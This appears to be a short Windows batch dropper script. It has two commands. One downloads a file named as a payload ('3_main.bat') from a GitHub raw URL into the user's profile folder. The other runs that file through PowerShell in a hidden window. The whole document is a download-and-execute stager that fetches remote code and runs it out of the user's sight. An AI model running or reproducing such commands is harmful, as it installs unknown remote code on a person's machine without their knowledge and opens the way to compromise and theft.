cmd /C "curl https://raw.githubusercontent.com/BigGreenHat14/biggreenhat14.github.io/refs/heads/main/payloads/3_main.bat > %USERPROFILE%\torun.bat"
powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"$env:USERPROFILE\torun.bat\""
